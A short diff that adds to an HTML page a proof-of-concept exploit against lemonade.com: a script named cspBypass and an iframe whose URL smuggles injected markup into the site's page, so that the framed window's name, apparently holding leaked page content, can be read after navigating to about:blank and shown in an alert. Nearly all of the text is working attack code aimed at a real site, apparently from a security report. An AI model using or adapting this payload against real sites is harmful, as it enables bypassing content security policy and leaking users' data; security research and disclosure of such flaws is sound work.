@@ -5,6 +5,16 @@
     <title>THIS</title>
   </head>
   <body>
+    <script>
+      function cspBypass(win) {
+      win[0].location = 'about:blank';
+      setTimeout(()=>alert(win[0].name), 500);
+      }
+    </script>
+    <iframe 
+            src="//me.lemonade.com/><iframe name=%27" 
+            onload="cspBypass(this.contentWindow)">
+    </iframe>
     <iframe
             src="https://www.lemonade.com/onboarding/start"
             width="720px"
